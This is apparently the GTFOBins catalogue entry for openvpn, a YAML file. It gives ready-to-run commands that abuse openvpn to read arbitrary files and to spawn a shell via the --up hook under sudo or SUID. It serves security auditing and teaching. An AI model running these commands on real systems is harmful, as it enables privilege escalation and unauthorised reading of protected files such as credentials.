<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/openvpn -->
---
functions:
  file-read:
  - code: |-
      openvpn --config /path/to/input-file
    comment: |-
      The file is actually parsed and the first partial wrong line is returned in an error message.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      openvpn --dev null --script-security 2 --up '/bin/sh -s'
    contexts:
      sudo:
      suid:
        code: |-
          openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
        shell: false
      unprivileged:
...
